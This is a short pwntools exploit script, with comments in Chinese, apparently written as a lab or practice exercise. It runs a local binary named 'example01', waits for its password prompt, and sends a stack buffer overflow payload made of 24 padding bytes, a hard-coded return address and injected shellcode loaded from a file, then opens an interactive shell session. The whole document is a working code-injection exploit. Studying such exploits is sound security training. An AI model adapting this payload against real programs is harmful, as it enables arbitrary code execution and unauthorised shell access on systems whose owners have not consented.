from pwn import *
import time
context.terminal = ['gnome-terminal', '-e']

# 设置本地程序路径
binary = './example01'
# 连接本地程序
p = process(binary)
# gdb.attach(p, '''
# b *0x5655625c
# ''')
# time.sleep(3)

# 接收程序输出
print(p.recvuntil(b'Enter password:'))

retaddr=0xffffd000#0xffffcfa0
#shellcode=asm(shellcraft.linux.sh())
shellcode=open('codeinjection.bin','rb').read()[206:]
payload=b'A'*24 + p32(retaddr) + shellcode

# 发送输入给程序
p.sendline(payload)

p.interactive()

# 关闭连接
p.close()
